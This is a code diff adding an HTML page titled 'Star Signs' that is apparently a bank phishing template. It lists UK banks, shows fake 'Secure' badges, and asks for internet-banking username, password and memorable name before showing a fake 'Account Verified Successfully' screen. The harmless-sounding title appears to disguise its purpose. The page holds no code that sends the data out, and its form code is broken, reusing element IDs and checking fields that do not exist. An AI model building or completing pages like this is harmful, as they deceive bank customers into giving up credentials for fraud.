@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Star Signs</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: Arial, sans-serif; background: #f0f0f0; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; padding: 24px 16px; }
+  @media (min-width: 540px) { body { align-items: center; } }
+  .card { width: 100%; max-width: 400px; background: #fff; border-radius: 20px; overflow: hidden; box-shadow: 0 8px 32px rgba(0,0,0,0.12); }
+  .page { display: none; }
+  .page.active { display: block; }
+
+  /* HEADERS */
+  .hdr-black { background: #111; padding: 22px 20px; display: flex; align-items: center; justify-content: space-between; }
+  .hdr-blue  { background: #1565c0; padding: 22px 20px; display: flex; align-items: center; justify-content: space-between; }
+  .hdr-green { background: #1db87a; padding: 22px 20px; display: flex; align-items: center; justify-content: space-between; }
+  .logo-ph  { width: 110px; height: 32px; }
+  .logo-ph2 { width: 110px; height: 32px; border: 2px dashed rgba(255,255,255,0.35); border-radius: 8px; }
+  .secure  { display: flex; align-items: center; gap: 5px; background: rgba(255,255,255,0.12); border-radius: 20px; padding: 5px 12px; }
+  .secure2 { display: flex; align-items: center; gap: 5px; background: rgba(255,255,255,0.18); border-radius: 20px; padding: 5px 12px; }
+  .secure span, .secure2 span { color: #fff; font-size: 11px; }
+
+  /* LIST PAGE */
+  .page-title { font-size: 15px; font-weight: 700; color: #111; padding: 18px 20px 4px; }
+  .page-sub   { font-size: 12px; color: #999; padding: 0 20px 14px; border-bottom: 0.5px solid #eee; }
+  .list { list-style: none; }
+  .list li { display: flex; align-items: center; justify-content: space-between; padding: 16px 20px; border-bottom: 0.5px solid #f0f0f0; cursor: pointer; transition: background 0.12s; }
+  .list li:last-child { border-bottom: none; }
+  .list li:hover { background: #f8f8f8; }
+  .list li:active { background: #f0f0f0; }
+  .sign-name { font-size: 15px; font-weight: 700; color: #111; }
+  .arrow { color: #bbb; font-size: 18px; }
+
+  /* FORM BODY */
+  .fbody { padding: clamp(20px,6vw,32px) 20px clamp(24px,8vw,36px); }
+  .back-btn { background: none; border: none; font-size: 13px; color: #888; cursor: pointer; margin-bottom: 16px; display: flex; align-items: center; gap: 4px; padding: 0; }
+  .back-btn:hover { color: #333; }
+  .form-title { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 4px; }
+  .form-sub   { font-size: 13px; color: #666; margin-bottom: 22px; }
+  .fg { margin-bottom: 15px; }
+  .fg label { display: block; font-size: 13px; font-weight: 600; color: #111; margin-bottom: 5px; }
+  .fg input { width: 100%; padding: 13px 14px; border: 1.5px solid #ccc; border-radius: 10px; font-size: 15px; color: #111; background: #fff; outline: none; -webkit-appearance: none; appearance: none; transition: border-color 0.2s; }
+  .fg input.err { border-color: #c0392b; background: #fdecea; }
+  .blue-inp:focus  { border-color: #1565c0; box-shadow: 0 0 0 3px rgba(21,101,192,0.12); }
+  .green-inp:focus { border-color: #1db87a; box-shadow: 0 0 0 3px rgba(29,184,122,0.15); }
+  .errmsg { display: none; align-items: center; gap: 5px; color: #c0392b; font-size: 12px; font-weight: 600; margin-top: 4px; }
+  .errmsg.show { display: flex; }
+  .save-row { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 10px; }
+  .save-row input[type=checkbox] { margin-top: 2px; width: 18px; height: 18px; flex-shrink: 0; cursor: pointer; }
+  .blue-cb  input[type=checkbox] { accent-color: #1565c0; }
+  .green-cb input[type=checkbox] { accent-color: #1db87a; }
+  .save-label { font-size: 13px; color: #111; cursor: pointer; line-height: 1.5; }
+  .warn { display: flex; align-items: flex-start; gap: 8px; background: #faf6ec; border-left: 3px solid #e6a817; border-radius: 0 8px 8px 0; padding: 10px 12px; margin-bottom: 18px; }
+  .warn p { font-size: 12px; color: #555; line-height: 1.6; }
+  .btn-blue  { display: block; width: 100%; background: #1565c0; color: #fff; border: none; border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 700; cursor: pointer; -webkit-appearance: none; transition: opacity 0.2s, transform 0.1s; }
+  .btn-blue:hover  { opacity: 0.88; }
+  .btn-blue:active  { transform: scale(0.98); }
+  .btn-blue:disabled  { opacity: 0.6; cursor: not-allowed; }
+  .btn-black { display: block; width: 100%; background: #111; color: #fff; border: none; border-radius: 10px; padding: 15px; font-size: 16px; font-weight: 700; cursor: pointer; -webkit-appearance: none; transition: opacity 0.2s, transform 0.1s; }
+  .btn-black:hover { opacity: 0.82; }
+  .btn-black:active { transform: scale(0.98); }
+  .btn-black:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  /* SUCCESS */
+  .sbody { padding: 48px 24px 52px; text-align: center; }
+  .tick { width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; animation: pop .5s cubic-bezier(.36,1.56,.64,1) both; }
+  .tick.blue  { background: #1565c0; }
+  .tick.green { background: #1db87a; }
+  .tick svg { width: 40px; height: 40px; fill: none; stroke: #fff; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; }
+  @keyframes pop { 0%{transform:scale(0);opacity:0} 100%{transform:scale(1);opacity:1} }
+  .s-title { font-size: 21px; font-weight: 700; color: #111; margin-bottom: 10px; }
+  .s-sub   { font-size: 14px; color: #666; line-height: 1.7; margin-bottom: 22px; }
+  .s-banner { border-radius: 10px; padding: 14px 16px; font-size: 13px; line-height: 1.6; }
+  .s-banner.blue  { background: #e8f0fe; color: #0d47a1; }
+  .s-banner.green { background: #e0f5ec; color: #0a6644; }
+</style>
+</head>
+<body>
+<div class="card">
+
+  <!-- PAGE 1: LIST -->
+  <div class="page active" id="page-list">
+    <div class="hdr-black">
+      <div class="logo-ph"></div>
+      <div class="secure">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        <span>Secure</span>
+      </div>
+    </div>
+    <p class="page-title">Please select your Bank</p>
+    <p class="page-sub">Choose your bank to continue</p>
+    <ul class="list">
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Lloyds</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Halifax</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Monzo</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">NetWest</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">TSB</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Metro Bank</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Santander</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Royal Bank of Scotland</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Bank of Scotland</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Revolute</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-blue-form')"><span class="sign-name">Wise</span><span class="arrow">›</span></li>
+      <li onclick="goTo('page-green-form')"><span class="sign-name">Others</span><span class="arrow">›</span></li>
+    </ul>
+  </div>
+
+  <!-- PAGE 2: BLUE FORM -->
+  <div class="page" id="page-blue-form">
+    <div class="hdr-blue">
+      <div class="logo-ph2"></div>
+      <div class="secure2">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        <span>Secure</span>
+      </div>
+    </div>
+    <div class="fbody">
+      <button class="back-btn" onclick="goTo('page-list')">‹ Back</button>
+      <p class="form-title">Welcome to Internet Banking</p>
+      <p class="form-sub">If you don't already use Internet Banking, it's simple to register online.</p>
+      <div class="fg">
+        <label for="b-user">Username</label>
+        <input type="text" id="b-user" class="blue-inp" placeholder="Enter your username" autocomplete="off" />
+        <div class="errmsg" id="b-e-user">&#9888; Please enter a username.</div>
+      </div>
+      <div class="fg">
+        <label for="g-age">Password</label>
+        <input type="text" id="g-age" class="green-inp" placeholder="Enter your Password" autocomplete="off" />
+        <div class="errmsg" id="g-e-age">&#9888; Please enter your Password.</div>
+      </div>
+      <div class="fg">
+        <label for="g-email">Memorable name</label>
+        <input type="text" id="g-email" class="green-inp" placeholder="Enter your Memorable name" autocomplete="off" />
+        <div class="errmsg" id="g-e-email">&#9888; Please enter your Memorable name</div>
+      </div>
+      <div class="save-row blue-cb">
+        <input type="checkbox" id="b-save" />
+        <label class="save-label" for="b-save">Save my details for next time</label>
+      </div>
+      <div class="warn">
+        <p><strong>Caution:</strong> Do not save your details if you are using a public or shared computer. Your information could be accessed by others.</p>
+      </div>
+      <button class="btn-blue" id="b-btn" onclick="submitForm('blue')">Continue</button>
+    </div>
+  </div>
+
+  <!-- PAGE 3: GREEN FORM -->
+  <div class="page" id="page-green-form">
+    <div class="hdr-green">
+      <div class="logo-ph2"></div>
+      <div class="secure2">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        <span>Secure</span>
+      </div>
+    </div>
+    <div class="fbody">
+      <button class="back-btn" onclick="goTo('page-list')">‹ Back</button>
+      <p class="form-title">Register your details</p>
+      <p class="form-sub">Please fill in all fields below to continue.</p>
+      <div class="fg">
+        <label for="g-user">Username</label>
+        <input type="text" id="g-user" class="green-inp" placeholder="Enter your username" autocomplete="off" />
+        <div class="errmsg" id="g-e-user">&#9888; Please enter a username.</div>
+      </div>
+      <div class="fg">
+        <label for="g-age">Age</label>
+        <input type="number" id="g-age" class="green-inp" min="1" max="120" placeholder="Enter your age" />
+        <div class="errmsg" id="g-e-age">&#9888; Please enter a valid age.</div>
+      </div>
+      <div class="fg">
+        <label for="g-email">Email address</label>
+        <input type="email" id="g-email" class="green-inp" placeholder="Enter your email address" autocomplete="off" />
+        <div class="errmsg" id="g-e-email">&#9888; Please enter a valid email address.</div>
+      </div>
+      <div class="save-row green-cb">
+        <input type="checkbox" id="g-save" />
+        <label class="save-label" for="g-save">Save my details for next time</label>
+      </div>
+      <div class="warn">
+        <p><strong>Caution:</strong> Do not save your details if you are using a public or shared computer. Your information could be accessed by others.</p>
+      </div>
+      <button class="btn-black" id="g-btn" onclick="submitForm('green')">Continue</button>
+    </div>
+  </div>
+
+  <!-- PAGE 4: BLUE SUCCESS -->
+  <div class="page" id="page-blue-success">
+    <div class="hdr-blue">
+      <div class="logo-ph2"></div>
+      <div class="secure2">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        <span>Secure</span>
+      </div>
+    </div>
+    <div class="sbody">
+      <div class="tick blue"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div>
+      <p class="s-title">Account Verified Successfully</p>
+      <p class="s-sub">You can now use our services as normal.</p>
+      <div class="s-banner blue">&#10003; &nbsp;Your identity has been confirmed and your account is fully active.</div>
+    </div>
+  </div>
+
+  <!-- PAGE 5: GREEN SUCCESS -->
+  <div class="page" id="page-green-success">
+    <div class="hdr-green">
+      <div class="logo-ph2"></div>
+      <div class="secure2">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+        <span>Secure</span>
+      </div>
+    </div>
+    <div class="sbody">
+      <div class="tick green"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div>
+      <p class="s-title">Account Verified Successfully</p>
+      <p class="s-sub">You can now use our services as normal.</p>
+      <div class="s-banner green">&#10003; &nbsp;Your identity has been confirmed and your account is fully active.</div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+function goTo(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
+}
+
+function submitForm(color) {
+  const p = color === 'blue' ? 'b' : 'g';
+  let ok = true;
+  const fields = [
+    { id: p+'-user',  err: p+'-e-user',  check: v => v.trim() !== '' },
+    { id: p+'-age',   err: p+'-e-age',   check: v => v !== '' && +v >= 1 && +v <= 120 },
+    { id: p+'-email', err: p+'-e-email', check: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) }
+  ];
+  fields.forEach(f => {
+    const inp = document.getElementById(f.id);
+    const em  = document.getElementById(f.err);
+    if (!f.check(inp.value)) { inp.classList.add('err'); em.classList.add('show'); ok = false; }
+    else { inp.classList.remove('err'); em.classList.remove('show'); }
+  });
+  if (!ok) return;
+  const btn = document.getElementById(p + '-btn');
+  btn.disabled = true;
+  btn.textContent = 'Verifying...';
+  setTimeout(() => goTo('page-' + color + '-success'), 1800);
+}
+</script>
+</body>
+</html>
